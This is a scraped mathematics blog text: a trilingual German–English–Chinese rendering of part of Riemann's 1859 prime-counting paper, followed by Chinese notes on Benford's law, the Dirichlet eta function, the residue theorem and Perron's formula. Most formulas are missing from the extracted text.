sämmtliche übrigen complexen Grössen enthält, erstreckt werden, da das Integral durch Werthe mit unendlich grossem Modul dann unendlich klein ist. When the real part of is negative, the integral can be taken, instead of in the positive sense around the boundary of the given domain, in the negative sense around the complement of this domain because in that case (when ) the integral over values with infinitely large modulus is infinitely small. 如果复数 的实部为负数，则积分路径也可通过取别的路径来计算，与按正方向围绕先前描述的区域的路径不同，这次路径是按负方向围绕上述区域的余集，这是因为对于所有的有充分大模的 ，所对应的积分是无穷小。 Im Innern dieses Grössengebiets aber wird die Function unter dem Integralzeichen nur unstetig, wenn gleich einem ganzen Vielfachen von wird und das Integral ist daher gleich der Summe der Integrale negativ um diese Werthe genommen. But inside this complementary domain the only singularities of the integrand are at the integer multiples of , and the integral is therefore equal to the sum of the integrals taken around these singularities in the negative sense. 但在这个互补区域的内部，仅当 等于 的整数倍时，被积函数才是不连续的，所以积分等于那些按负方向围绕这些奇点的积分之和。 Das Integral um den Werth aber ist , man erhält daher Since the integral around the value is , this gives 由于围绕点 的积分结果为 ，所以得出 also eine Relation zwischen und , welche sich mit Benutzung bekannter Eigenschaften der Function auch so ausdrücken lässt: and therefore a relation between and which, by making use of known properties of the function , can also be formulated as the statement that: 因此，这也给出了 与 之间的一个关系，这个关系通过利用函数 的已知性质，也可以表示为： bleibt ungeändert, wenn in verwandelt wird. remains unchanged when is replaced by . 当把 替换为 时，其结果保持不变。 Diese Eigenschaft der Function veranlasste mich statt das Integral in dem allgemeinen Gliede der Reihe einzuführen, wodurch man einen sehr bequemen Ausdruck der Function erhält. In der That hat man This property of the function motivated me to consider the integral instead of the integral in the general term of , which leads to a very convenient expression of the function . In fact 该函数的这一特性促使我引入关于 的积分来替换 ，作为级数 的一般项的乘数，从而得到了函数 的一个非常简洁的表达式。事实上，我们有 also, wenn man so when one sets 因而，如果我们令 setzt, it follows that 则有 oder da or, because 因为 (Jacobi, Fund., p. 184), that 所以，我们有 Ich setze nun und I now set and 我现在令 ，以及 so dass so that 从而有 oder auch or also 或者 Diese Function ist für alle endlichen Werthe von endlich, und lässt sich nach Potenzen von in eine sehr schnell convergirende Reihe entwickeln. This function is finite for all finite values of and can be developed as a power series in which converges very rapidly. 这个函数对于所有有限的 值，都是有限的，并且可以按 的幂展开成收敛速度极快的级数。 Da für einen Werth von , dessen reeller Bestandtheil grösser als ist, endlich bleibt, und von den Logarithmen der übrigen Factoren von dasselbe gilt, so kann die Function nur verschwinden, wenn der imaginäre Theil von zwischen und liegt. Now since for values of with real part greater than , is finite and since the same is true of the other factors of , the function can vanish only when the imaginary part of lies between and . 因为对于任意实部大于 的 来说， 仍然是一个有限的，而且 的其他因数也具有同样的性质，所以仅当 的虚部位于 和 之间时，函数 才可变为零。 Die Anzahl der Wurzeln von , deren reeller Theil zwischen und liegt, ist etwa The number of roots of whose real parts lie between and is about 方程 的实部位于 到 之间的根的数量大约是 denn das Integral positiv um den Inbegriff der Werthe von erstreckt, deren imaginärer Theil zwischen und und deren reeller Theil zwischen und liegt, ist ( bis auf einen Bruchtheil von der Ordnung der Grösse ) gleich ; dieses Integral aber ist gleich der Anzahl der in diesem Gebiet liegenden Wurzeln von , multiplicirt mit . because the integral taken in the positive sense around the domain consisting of all values whose imaginary parts lie between and and whose real parts lie between and is (up to a fraction of the order of magnitude of ) equal to and is, on the other hand, equal to the number of roots of in the domain multiplied by . 这是因为积分式 的值（忽略一个阶为 的次要项）等于 ，这里的积分路径是一个正向的围道，其内部包含了所有虚部介于 到 之间且实部介于 到 之间的 值，而这个积分又等于方程 在这个区域内的根的数目的 倍。 Man findet nun in der That etwa so viel reelle Wurzeln innerhalb dieser Grenzen, und es ist sehr wahrscheinlich, dass alle Wurzeln reell sind. One finds in fact about this many real roots within these bounds and it is very likely that all of the roots are real. 实际上，我们在这个范围内找到了大约这个数目的实根，而且很有可能所有的根都是实数。 Hiervon wäre allerdings ein strenger Beweis zu wünschen; ich habe indess die Aufsuchung desselben nach einigen flüchtigen vergeblichen Versuchen vorläufig bei Seite gelassen, da er für den nächsten Zweck meiner Untersuchung entbehrlich schien. One would of course like to have a rigorous proof of this, but I have put aside the search for such a proof after some fleeting vain attempts because it is not necessary for the immediate objective of my investigation. 当然，人们希望能找到这一结论的严谨证明，但我经过几次短暂而徒劳的尝试后已经放弃了寻找这种证明的努力，因为这对于我当前的研究目标来说并非必要。 Bezeichnet man durch jede Wurzel der Gleichung , so kann man durch If one denotes by the roots of the equation , then one can express as 若将方程 的根记为 ，那么就可以将 表示为 ausdrücken; denn da die Dichtigkeit der Wurzeln von der Grösse mit nur wie wächst, so convergirt dieser Ausdruck und wird für ein unendliches nur unendlich wie ; er unterscheidet sich also von um eine Function von , die für ein endliches stetig und endlich bleibt und mit dividirt für ein unendliches unendlich klein wird. because, since the density of roots of size grows only like as grows, this expression converges and for infinite is only infinite like ; thus it differs from by a function of which is continuous and finite for finite and which, when divided by , is infinitely small for infinite . 因为根的密度随着 的增长仅与 一样快，所以这个表达式是收敛的，并且当 趋向无穷大时，其阶为 ；因此，表达式与 的差是这样的一个量，它是 的函数，对于所有有限的 来说，这个函数任然是连续且有限的，并且当除以 时，对于无穷大的 来说，它是无穷小的。 Dieser Unterschied ist folglich eine Constante, deren Werth durch Einsetzung von bestimmt werden kann. This difference is therefore a constant, the value of which can be determined by setting . 因此，这个差是一个常数，其具体数值可通过取 来确定。 Mit diesen Hülfsmitteln lässt sich nun die Anzahl der Primzahlen, die kleiner als , sind, bestimmen. With these preparatory facts, the number of primes less than can now be determined. 有了这些准备工作所得到的结论，那么小于 的质数的个数就可以确定了。 Es sei , wenn nicht gerade einer Primzahl gleich ist, gleich dieser Anzahl, wenn aber eine Primzahl ist, um grösser, so dass für ein , bei welchem sich sprungweise ändert, Let , when is not exactly equal to a prime, be equal to this number, but when is a prime let it be greater by so that for an where jumps 设函数 ，当 不是一个质数时，函数值为上述的素数个数；但当 为质数时，函数值为素数个数与 的和，因此，每当 的数值在 处发生跳跃时，总有 Ersetzt man nun in If one sets 我们通过替换 in the formula 级数中 so erhält man one finds 从而得到 wenn man when one denotes 我们用 durch bezeichnet. by 来表示 Diese Gleichung ist gültig für jeden complexen Werth von , wenn . This equation is valid for every complex value of provided . 当 时，此等式对于 的每一个复数值 都成立。 Wenn aber in diesem Umfange die Gleichung But when in such circumstances 然而，如果等式 gilt, so kann man mit Hülfe des Fourier'schen Satzes die Function durch die Function ausdrücken. is valid, the function can be expressed in terms of by meansof Fourier's theorem. 在这个区域里成立，则用傅里叶的理论，函数 可以用 来表示。 Die Gleichung zerfällt, wenn reell ist und , in den beiden folgenden: The equation splits when is real and when into the two equations 如果 是实的并且有 时，该方程会分裂为以下两个方程： Wenn man beide Gleichungen mit multiplicirt und von bis integrirt, so erhält man in beiden auf der rechten Seite nach dem Fourier'schen Satze , also, wenn man beide Gleichungen addirt und mit multiplicirt, When both equations are multiplied by and integrated from to , one finds in both cases that the right side is that when they are added and multiplied by 当将两个方程分别乘以 并从 到 进行积分，则由傅立叶的理论，每个等式的右边变为 。因此，将两者相加并乘以 之后，我们得到 worin die Integration so auszuführen ist, dass der reelle Theil von constant bleibt. where the integration is to be carried out in such a way that the real part of remains constant. 这里的积分路线这样来选取，使得 的实部保持为常数。 Das Integral stellt für einen Werth von , bei welchem eine sprungweise Aenderung der Function stattfindet, den Mittelwerth aus den Werthen der Function zu beiden Seiten des Sprunges dar. The integral represents, for a value of where the function has a jump, the middle value between the two values of on either side of the jump. 对于函数 有跳跃的每个 值，积分表示的是跳跃点两侧的 函数值之间的平均值。 Bei der hier vorausgesetzten Bestimmungsweise der Function besitzt diese dieselbe Eigenschaft, und man hat daher völlig allgemein The function was defined in such a way that it too has this property, so one has in full generality 上边函数 的定义方式使得它也具备这一特性，因此在一般情况下，我们有 Für kann man nun den früher gefundenen Ausdruck For one can now substitute the expression 对于先前得到的 来说，现在可以代入这个表达式 substituiren; die Integrale der einzelnen Glieder dieses Ausdrucks würden aber dann ins Unendliche ausgedehnt nicht convergiren, weshalb es zweckmässig ist, die Gleichung vorher durch partielle Integration in found above; the integrals of the individual terms of this expression will not converge, however, when they are taken to infinity, so it is advantageous to reformulate the equation as 然而，当积分限为无穷时，这个表达式的单独项的积分不会收敛，因此最好是通过分部积分法，先将等式转换成 umzuformen. by integration by parts. 通过分部积分法。 Da Since 因为 für , also for and therefore, 对于 ，因此， so erhalten dann sämmtliche Glieder des Ausdruckes für mit Ausnahme von all of the terms in the expression for except for the term 于是， 的表达式的所有项，除去例外项 die Form take the form 均型如 Nun ist aber But 此时 und, wenn der reelle Theil von rösser als der reelle Theil von ist, and, when the real part of is greater than the real part of , 且当数 的实部大于 的实部时， oder or 或者 je nachdem der reelle Theil von negativ oder positiv ist. Man hat daher depending on whethert the real part of is negative or positive. Thus 这取决于 的实部是负数还是正数。因此 im ersten und in the first case and 在第一种情况下以及 im zweiten Falle in the second case. 在第二种情况下。 Im ersten Falle bestimmt sich die Integrationsconstante, wenn man den reellen Theil von negativ unendlich werden lässt; In the first case the constant of integration can be determined by taking to be negative and infinite. 在第一种情况下，令 的实部取负无穷大，就可以确定积分常数。 im zweiten Falle erhält das Integral von bis um verschiedene Werthe, je nachdem die Integration durch complexe Werthe mit positivem oder negativem Arcus geschieht, und wird, auf jenem Wege genommen, unendlich klein, wenn der Coefficient von in dem Werthe von positiv unendlich wird, auf letzterem aber, wenn dieser Coefficient negativ unendlich wird. In the second case the integral from to takes on two values which differ by depending on whether the path of integration is in the upper halfplane or in the lower halfplane; if the path of integration is in the upper halfplane, the integral will be infinitely small when the coefficient of in is infinite and positive, and if the path is in the lower halfplane, the integral will be infinitely small when the coefficient of in is infinite and negative. 在第二种情况下，根据积分路径在实轴的上方还是下方，从 到 的积分取两个不同的值，这两个值之间相差 ；如果积分路径在上半平面，当 中 的系数为正无穷大时，积分为无穷小；而如果积分路径在下半平面，当 中 的系数为负无穷大时，积分为无穷小。 Hieraus ergiebt sich, wie auf der linken Seite zu bestimmen ist, damit die Integrationsconstante wegfällt. This shows how to determine the values of on the left side in such a way that the constants of integration drop out. 这展示了如何在左侧确定 的值，使得积分常数能够消失。 Durch Einsetzung dieser Werthe in den Ausdruck von $f(x) erhält man By setting these values in the expression for one finds 通过将这些值代入 的表达式中，便可以得出结论 wenn in für sämmtliche positiven ( oder einen positiven reellen Theil enthaltenden ) Wurzeln der Gleichung , ihrer Grösse nach geordnet, gesetzt werden. where the sum is over all positive roots (or all roots with positive real parts) of the equation , ordered according to their size. 其中， 表示方程 的所有正根（更确切地是所有正实部的复根）求和，这些根按照模的增序排列。 Es lässt sich, mit Hülfe einer genaueren Discussion der Function , leicht zeigen, dass bei dieser Anordnung der Werth der Reihe It is possible, by means of a more exact discussion of the function , easily to show that with this ordering of the roots the sum of the series 通过更精确地探讨函数 的性质，很容易就能证明，在这种根的排列方式下，级数 mit dem Grenzwerth, gegen welchen is the same as the limiting value of 收敛到一个极限，这个极限与积分 bei unaufhörlichem Wachsen der Grösse convergirt, übereinstimmt; durch veränderte Anordnung aber würde sie jeden beliebigen reellen Werth erhalten können. as grows without bound; by a different ordering, however, it can approach any arbitrary real value. 当 趋向无穷时所得的极限是一样的；然而，如果改变这种排序的话，级数能够收敛到任意的实数值。 Aus findet sich mittelst der durch Umkehrung der Relation From one can find byinverting 函数 可以由 来得到，这要通过反转关系式 sich ergebenden Gleichung to find 产生出 worin für der Reihe nach die durch kein Quadrat ausser theilbaren Zahlen zu setzen sind und die Anzahl der Primfactoren von bezeichnet. where ranges over all positive integers which are not divisible by any square other than and where denotes the number of prime factors of . 其中， 取遍所有这样的自然数，他们不能被除了 以外的任何平方数整除，而 表示 的质因子个数。 Beschränkt man auf eine endliche Zahl von Gliedern, so giebt die Derivirte des Ausdrucks für oder, bis auf einen mit wachsendem sehr schnell abnehmenden Theil, If is restricted to a finite number of terms, then the derivative of the expression for or, except for a part which decreases very rapidly as increases, 如果我们将和式 中将求和限制为有限项，那么函数 的表达式的导数（忽略一个随着 的增大而迅速减小的项）就成为 einen angenäherten Ausdruck für die Dichtigkeit der Primzahlen der halben Dichtigkeit der Primzahlquadrate von der Dichtigkeit der Primzahlcuben u. s. w. von der Grösse . gives an approximate expression for the density of primes half the density of prime squares the density of prime cubes, etc., of magnitude . 这给出了一个渐进表达式，它是关于不超过 的素数的密度，加上素数平方的密度的一半，再加上素数立方的密度的 ，等等。 Die bekannte Näherungsformel ist also nur bis auf Grössen von der Ordnung richtig und giebt einen etwas zu grossen Werth; denn die nicht periodischen Glieder in dem Ausdrucke von sind, von Grössen, die mit nicht in's Unendliche wachsen, abgesehen: Thus the known approximation is correct only to an order of magnitude of and gives a value which is somewhat too large, because the nonperiodic terms in the expression of are, except for quantities which remain bounded as increases, 因而，众所周知的近似公式 仅在一个阶为 的数量范围上是正确的，并且给出的值有些过大，在 表达式中，排除掉那些随着 的增大而保持有界的项之后，非周期项为 In der That hat sich bei der von Gauss und Goldschmidt vorgenommenen und bis zu rei Millionen fortgesetzten Vergleichung von mit der Anzahl der Primzahlen unter diese Anzahl schon vom ersten Hunderttausend an stets kleiner als ergeben, und zwar wächst die Differenz unter manchen Schwankungen allmählich mit . In fact the comparison of with the number of primes less than which was undertaken by Gauss and Goldschmidt and which was pursued up to three million shows that the number of primes is already less than in the first hundred thousand and that the difference, with minor fluctuations, increases gradually as increases. 事实上，高斯和戈尔德施密特曾做过对 与小于 的素数个数之间的比较，并一直进行到 三百万。他们的研究结果表明，在前一百万个数中，素数的个数就已经小于 ，而且两者之差在经过多次震荡之后，随着 的增大，这种差异会逐渐增大。 Aber auch die von den periodischen Gliedern abhängige stellenweise Verdichtung und Verdünnung der Primzahlen hat schon bei den Zählungen die Aufmerksamkeit erregt, ohne dass jedoch hierin eine Gesetzmässigkeit bemerkt worden wäre. The thickening and thinning ofprimes which is represented by the periodic terms in the formula has also been observed in the counts of primes, without, however, any possibility of establishing a law for it having been noticed. 素数个数的密度因周期项而增减的事实已经在计算中被观察到，但还未注意到它是否遵循某种规律。 Bei einer etwaigen neuen Zählung würde es interessant sein, den Einfluss der einzelnen in dem Ausdrucke für die Dichtigkeit der Primzahlen enthaltenen periodischen Glieder zu verfolgen. It would be interesting in a future count to examine the influence of individual periodic terms in the formula for the density of primes. 如果将来再做计算的话，继续探究表达式中个别周期项对于素数密度的影响将会是一件有趣的事情。 Einen regelmässigeren Gang als würde die Function zeigen, welche sich schon im ersten Hundert sehr deutlich als mit im Mittel übereinstimmend erkennen lässt. More regular than the behavior of is the behavior of which already in the first hundred is on average very nearly equal to . 函数 可能有比函数 更规律的性态。实际上，在前一百个值中，它确实在平均意义上非常接近于 。"},{"title":"","date":"2025-09-20T02:39:00.000Z","updated":"2025-09-20T02:57:00.000Z","comments":true,"path":"notes/Zeta/20.html","permalink":"https://blog.mhuig.top/notes/Zeta/20","excerpt":"","text":"本福特定律 本福特定律 世界是对数的好奇怪啊！一秒、一天、一年的时长从来没有变过。为什么我们会觉得时间越过越快呢？ 这是因为你越长大，一年在你的人生比例中变得越小。你就觉得时间越过越快了。 我们对世界的感受，其实不是感受的外界变化的绝对值，而是变化的相对比例。 人的感觉是和实际物理量的对数成正比。 为什么我们会用复杂的对数感知世界呢？ 也许我们就活在一个对数的世界。 本福特定律本福特定律（Benford's Law），又称首位数定律，描述了在许多自然产生的数据集中，数字 到 作为首位数字出现的概率并非均匀分布，而是遵循特定的对数分布规律。该定律在数据验证、欺诈检测等领域有重要应用。 定律内容本福特定律指出，在满足条件的数据集中，数字 （ ）作为首位数字出现的概率为： 具体概率分布如下： 数字 概率（约） 1 30.1% 2 17.6% 3 12.5% 4 9.7% 5 7.9% 6 6.7% 7 5.8% 8 5.1% 9 4.6% 适用条件本福特定律适用于以下类型的数据： 跨多个数量级（如从 1 到 1,000,000），例如人口、地理数据、金融数据等。 自然产生而非人为设计（如人工编号、发票号、身份证号等通常不适用）。 样本量足够大（通常需上千条数据）。 数据分布符合 “对数尺度上的均匀分布”（如指数增长过程生成的数据）。 ️ 局限性以下情况可能不适用： 人为干预的数据（如定价策略为 $9.99）。 数据有最大值或最小值限制（如资产记录门槛）。 均匀分布或单一数量级的数据（如身高、体重）。 应用场景本福特定律常用于检测数据异常或造假： 财务审计：识别虚假账目。 选举数据验证：分析选票数字是否人为操纵。 学术研究：检测实验数据或统计调查的真实性。 其他领域：河流长度、山脉高度、股票价格等自然数据通常符合该定律。 数学基础定律的数学推导基于： 尺度不变性：数据单位变化不影响首位数字分布（如平方公里改为平方英里）。 遍历理论（Ergodic Theory）：通过 Birkhoff 遍历定理证明，当数据生成过程满足指数增长且增长率为无理数时，定律成立。 对数变换：将首位数字问题转化为单位区间上的无理旋转系统，利用均匀分布模 1 的性质。 本福特定律揭示了数字在自然数据中的内在规律，成为数据科学和审计领域中一个强大的工具。 素数分布满足本福特定律素数定理的密度描述素数定理表明：当 时，不超过 的素数个数 。 由此可得素数分布密度为： 该密度函数表明：素数在较大范围内的分布与 成正比。 对数尺度下的均匀性将 换为对数坐标。令 ，则 ，且 。 素数在区间 的数量可表示为： 这表明：在对数坐标 下，素数分布密度为常数 ，即在 轴上均匀分布 。 首位数字的概率转换一个数 的首位数字为 的条件等价于： （为整数） 在对数尺度下，该条件转化为： 其中 是 的小数部分（即 ）。 由于 均匀分布于 ，其小数部分 在 上均匀分布（当区间足够大时）。 概率积分首位数字为 的概率即 落在区间 的概率： 这正是本福特定律的公式。 一般化本福特定律2009 年西班牙马德里理工大学的巴托洛・卢克（Bartolo Luque）和卢卡斯・拉卡萨（Lucas Lacasa）发现，若素数分布的修正密度为 （ ），则对应广义公式 ，且当 时逼近经典本福特定律。 深层意义素数定理 → 对数均匀性 → 本福特定律 的链条揭示了： 素数的伪随机性本质是尺度不变性（即不同数量级素数分布的相似性）。 或许在未来某天，质数的秘密真的会变得像 “地球是圆的” 一样，成为我们知识体系中一个既深刻又基础的通识。"},{"title":"","date":"2025-09-25T00:08:00.000Z","updated":"2025-09-25T00:57:00.000Z","comments":true,"path":"notes/Zeta/21.html","permalink":"https://blog.mhuig.top/notes/Zeta/21","excerpt":"","text":"狄利克雷 Eta 函数 狄利克雷 Eta 函数 狄利克雷 函数（Dirichlet eta function） 定义狄利克雷 函数常用两种等价定义： 级数定义（适用于 ） 与黎曼 ζ 函数的关系 这个关系式可以将 函数的定义域解析延拓到整个复平面（除了 这个 函数的单极点）。 关键性质 性质 描述 公式 / 值 解析延拓 通过 ζ 函数关系延拓至整个复平面（除 ）。 在全平面亚纯 特殊值 在 处值为自然对数；在负整数点与伯努利数有关。 函数方程 由 函数的函数方程导出。 积分表达式 存在积分表示形式。 欧拉变换 一种级数重排方法，可加速收敛。 与黎曼 ζ 函数的关系狄利克雷 函数又被称为 交错 函数（alternating zeta function）。它和黎曼 函数 的紧密联系是其核心价值之一： 这个关系不仅用于解析延拓 ，反过来也提供了研究 的一个重要途径。黎曼 函数在临界带 内的性质，时常会涉及到 函数。 First, let's add the sum over all odd and even numbers: Now, we know that and , so we can write: Now, Let's add and subtract the same thing on the RHS: Now, by definition, the Riemann zeta function is given by: And we can use the fact that: So:"},{"title":"","date":"2025-09-29T10:05:00.000Z","updated":"2025-09-30T11:30:00.000Z","comments":true,"path":"notes/Zeta/22.html","permalink":"https://blog.mhuig.top/notes/Zeta/22","excerpt":"","text":"留数定理 留数定理 洛朗展开19 世纪法国数学家皮埃尔・阿方斯・洛朗发现，即使函数 在某点不解析，只要在以该点 为中心的环域 内解析，就能展开为同时包含正幂项和负幂项的双边幂级数: 其中： 是环域内绕内周一周的任意一条闭合曲线 这种级数结构 —— 正幂项构成描述常规解析行为的正则部分，负幂项形成刻画奇点特性的主要部分 —— 完美解决了泰勒级数无法处理奇点的困境。 奇点1. 可去奇点如果在奇点 处级数也是收敛的，此时收敛区域是一个圆，如果将 定义为 这样 在 点也是解析的，这正是可去奇点这一称谓的由来 2. 极点函数 在极点的空心邻域内的洛朗展开只有有限个负幂项，则 在 的邻域内解析， ，则 称为 的 阶极点，显然 反之，若 是 的孤立奇点，且 ，则 是 的极点 此外当 是 的 阶极点时， 又知道 在 点解析，所以 是 的 阶零点 特别的，一阶极点又称作单极点 3. 本性奇点函数在本性奇点领域的洛朗展开具有无穷多个负幂项 如果 是函数的本性奇点，则当 时 的极限不存在，即当 以不同方式趋向于 时， 趋向于不同的值 可以证明，对于本性奇点而言，任意给定一个复数（包括 ），总存在一个序列 ，使得 留数定理 若 在 所围区域内除 外都解析，则 在 内以 为中心处可展开为洛朗级数 环域 内任取闭合回路 ，由柯西定理 考虑以原点为中心的单位圆 （ 从 到 ），计算积分 ： 这个结果不依赖于圆的半径，仅由环绕原点的 “圈数” 决定。对于更一般的奇点 ，积分 ，而其他幂次项 （ ）的积分结果均为 。这一特性被称为柯西积分公式的特殊情形，是留数定理的 “种子”。 因此 称为 在 的留数，记作： 若 所围区域内包围 个奇点 ,可分别作回路 ,由柯西定理 总结得留数定理： 留数的计算规则 1 计算一阶极点的留数如果 为 的单极点，那么 若该极限为 型未定式，洛必达法则可直接用于求解。例如，对 ，若 且 ，则： 洛必达 （注：此处需满足洛必达法则的使用条件：分子分母在 的邻域内可导，且分母导数非零。） 规则 2 洛必达法则计算一阶极点的留数若 , , 在定义域内都解析， , , ,则 为 的单极点。 规则 3 计算高阶极点的留数如果前 个导数在 处为零，而第 个导数不为零，那么 是 的 阶极点。 如果 是 的 阶极点，那么 非零有限值 可以看成函数 的泰勒展开，则 项泰勒级数的系数 即为 在 点的留数 ,有 若该极限为 型未定式，可直接使用 次洛必达法则计算 阶极点的留数求解。例如: 对 ，若 在 处有 阶零点 , 在 处解析（允许 )，则 在 处有 阶极点（若 ）或更低阶极点（若 在 有零点）。 此时 ，代入留数公式需计算： 关键步骤：一层一层剥离计算：考察发现存在高阶极点，求导考察下一阶导数，计算留数，应用洛必达法则；考察发现存在高阶极点，求导考察下一阶导数，计算留数，应用洛必达法则；……… 重复操作求导后应用洛必达法则 次。 洛必达第次洛必达第次洛必达第次洛必达第次洛必达第次 （注：此处需满足洛必达法则的使用条件：分子分母在 的邻域内可导，且分母导数非零。） 经过 次求导操作后，考察发现不再存在高阶极点, 因此： 例题求 在 处的留数。 , 是单极点。 巴塞尔问题的留数解法巴塞尔问题：求自然数平方倒数之和 1. 构造围道积分关键是将级数求和与复积分联系起来。考虑函数 其极点包括： 整数点 ：由 的零点引起，为一阶极点； 原点 ： 分母导致的二阶极点。 取正方形围道 ：顶点为 ，包围所有 的整数点。当 时，围道积分 的模因 在围道上有界（ ）且 衰减足够快（ ）而趋于 。 2. 计算留数总和由留数定理，围道积分等于 乘以围道内所有留数之和： 整数点留数：对 ， （利用 ）。 原点留数： 是二阶极点，展开 ，则 洛朗展开中 项系数为 ，即 。 3. 求解级数和将留数代入留数定理： 注意 （ 项发散需剔除），整理得："},{"title":"","date":"2025-09-29T10:08:00.000Z","updated":"2025-11-08T00:58:00.000Z","comments":true,"path":"notes/Zeta/23.html","permalink":"https://blog.mhuig.top/notes/Zeta/23","excerpt":"","text":"多项式分式前 n 项和变换为积分 多项式分式前 n 项和变换为积分 把 化为积分。 方法 1：伽马函数变量换元替换要将求和 化为积分形式，我们可以利用 Gamma 函数和几何级数的性质。适用于 的情况。 步骤 1: 写出单个项的积分表示首先，回顾 Gamma 函数的定义, 对于 ： 通过变量替换（ , ），可以得到： 另一种更常用的形式是使用区间 上的积分（通过替换 , ）： 步骤 2: 对求和项应用积分表示将求和中的每一项用积分替换： 步骤 3: 交换求和与积分顺序由于被积函数在 上连续（除 外，但该点测度为零），且对于 ，积分和求和一致收敛，我们可以交换顺序： 这里，求和索引从 开始，因此 对应 从 到 。 步骤 4: 计算几何级数求和内部的求和是一个几何级数： 对于 当 时，该求和值为 ，但由于积分在单点上不影响结果，我们可以直接使用上述表达式。 步骤 5: 得到最终的积分形式将几何级数结果代入积分中： 方法 2 变换和反变换若 为多项式比多项式，分子的最高次更低，即 ( ) 则前 项和： 曲线 有限且包含所有极点，只考虑 的极点。 原理 —— 逆变换的变换为自身； 是 的一种变换, 它的内核可以与求和符号相互作用。 例如此处的变换与逆变换 ( 为多项式真分式)： 上面的反演变换是通过 复变函数的留数定理 实现。这一方法本质是留数定理在梅林逆变换中的应用。当 为亚纯函数时，梅林逆变换的无穷路径积分可通过围道变形转化为有限围道上的留数求和，此时无穷远弧线上的积分贡献为零。 当 的所有极点 被围道 包围时， 等于 在各极点处的留数之和： 这一结果将积分反演简化为代数运算，大幅简化计算，适用于 为有理函数或含有限极点的亚纯函数的场景。若 有高阶极点，需按高阶留数公式计算导数项，但核心逻辑不变。 另一种梅林逆变换的视角： 对于梅林正变换的变体 根据梅林变换的反演定理 ，若 满足一定条件（如在 上绝对可积且局部有界变差），则其反演公式为： 其中： 是一个实常数，需满足 在 上可积（通常 位于 的收敛域内）； 积分路径是复平面上的一条竖直线 。 但直接计算无穷围道的积分非常困难。 梅林正变换将函数映射到复平面，逆变换通过围道积分重构原函数，而留数定理则提供了计算逆变换的离散化路径。 解析函数的全局行为由其奇点完全控制。 梅林逆变换的无穷围道积分（平行于虚轴）与留数求和看似路径不同，实则通过解析函数的围道变形和奇点贡献原理达成等价。这种等价性是复分析中 “局部奇点决定整体积分” 思想的典型体现，核心逻辑可概括为：无穷围道积分通过闭合围道转化为留数求和，而圆弧部分的积分在特定条件下趋于零。 Tips 围道闭合：从无穷直线到闭合曲线的转化梅林逆变换的积分路径是复平面上的无穷竖直线 （ ， 为实常数），如公式 所示。为应用留数定理，需将此直线路径与一个半径 的圆弧 组合成闭合围道 。根据 Jordan 引理，若被积函数 在圆弧上满足有界性条件： 则圆弧积分 。此时，无穷围道积分等价于闭合围道积分： 留数定理：闭合围道积分的离散化根据留数定理，闭合围道积分等于围道内所有奇点留数之和： 其中 是 在围道内的孤立奇点（如极点）。结合圆弧积分趋于零的条件，可得： 关键条件：路径选取与奇点分离两种方法等价的核心前提是 围道必须包含所有相关奇点，且圆弧积分可忽略。具体需满足： 积分路径的解析性：参数 需位于 的解析区域内，确保直线路径不经过奇点 。 奇点分布的单侧性：若 ，当 时 ，故需将圆弧闭合在 左半平面（仅包含 的奇点）；若 ，则需闭合在右半平面。 衰减条件： 在圆弧上需足够快地衰减，例如 （ ），以确保圆弧积分趋于零 。 实例验证：黎曼 ζ 函数的梅林逆变换以黎曼 ζ 函数 （ ）为例，其梅林逆变换需计算 通过闭合左半平面围道，可得到 的奇点（单极点 、平凡零点 、非平凡零点 ）的留数之和，最终结果为 这一过程中，无穷围道积分完全转化为留数的离散求和，印证了两种路径的等价性 。总结：解析函数的局部 - 整体关联无穷围道积分与留数求和的等价性，本质是解析函数的奇点结构决定其积分值的体现。无穷围道积分是 “整体路径” 的直接计算，而留数求和则是 “局部奇点” 的贡献叠加，两者通过围道闭合和极限过程统一。这种转化不仅简化了计算（如将复杂积分变为有限求和），更揭示了复分析的深刻思想：解析函数的全局行为由其奇点完全控制。 无穷围道积分的路径无关性（如梅林逆变换中通过留数定理将积分转化为留数求和）与高斯定理揭示的 “积分与路径无关” 等等本质上同属广义斯托克斯定理的数学框架，核心是将区域积分与边界积分通过 “源” 的分布关联。 “积分只与边界有关” 是复分析中柯西积分定理（Cauchy's Integral Theorem） 的核心思想，其严格表述为：若函数在单连通区域内解析且在闭区域上连续，则沿区域内任意闭合曲线的积分值仅由曲线所围边界的拓扑性质决定，与路径的具体形状无关。 例题把 和 化为积分。 方法 1： 注意到 方法 2： 留数定理中间进行 次洛必达法则, 然后接着求剩下部分的 阶导数 求导，计算留数，洛必达求导，计算留数，洛必达求导，计算留数，洛必达求导，计算留数，洛必达求导，计算留数，洛必达 方法 3：高阶极点的留数计算公式 被积函数 中， 为整函数（无奇点），而 使函数在 处产生奇点，当 为正整数时， 为 阶极点，根据高阶极点留数公式： 若 为 阶极点，则 这里 ， ，故 代入公式得： 计算 的 阶导数： 取极限后得： 由留数定理，若围道 包围 ，则积分结果为： 方法 4：伽马函数的汉克尔围道 被积函数 仅在 处有奇点（因 对 无奇点）。 该积分与伽马函数的汉克尔表示式高度相似。伽马函数的汉克尔表示为： 其中 是汉克尔围道。 对比给定积分与伽马函数的汉克尔表示，将 替换为 ，可得： 数学的新发现也许就藏在你曾做过的例题里面"},{"title":"","date":"2025-10-06T08:10:00.000Z","updated":"2025-10-06T10:00:00.000Z","comments":true,"path":"notes/Zeta/25.html","permalink":"https://blog.mhuig.top/notes/Zeta/25","excerpt":"","text":"佩龙公式 佩龙公式 历史背景19 世纪末至 20 世纪初，解析数论面临的核心挑战是如何将离散算术函数与连续复分析工具连接起来。1859 年黎曼发表关于素数分布的开创性论文后，数学家们意识到狄利克雷级数的解析性质蕴含着数论函数的深刻信息。正是在这一背景下，德国数学家奥斯卡・佩龙（Oskar Perron）于 1907 年在研究连分数理论时首次系统提出了这一积分表示公式，其原始形式虽未直接针对数论问题，但很快被发现是连接狄利克雷级数与算术函数和的关键工具。 佩龙公式的核心意义在于提供了离散 - 连续对偶性的严格数学表述：它将数论中离散的求和运算（如素数计数函数）转化为复平面上的积分运算，从而允许应用柯西留数定理、围道积分等复分析方法研究数论问题。这种转换在素数定理的证明中展现出决定性作用 —— 通过将切比雪夫 ψ 函数表示为黎曼 ζ 函数的积分形式，数学家得以将素数分布问题转化为对 ζ 函数零点分布的研究。 严格定义与数学表述基本形式设 为算术函数，其狄利克雷级数生成函数为： 其中 为复变量，级数在半平面 （ 为收敛横坐标）内收敛。佩龙公式建立了该级数与部分和函数 之间的积分表示关系。 标准佩龙公式（非实效形式）表述为： 其中求和符号上的撇号表示当 为正整数时，末项需取半值（即 ），积分理解为柯西主值。 带余项的实用形式在实际计算中，无穷积分需截断为有限积分，此时带余项的佩龙公式更为有用。严格表述： 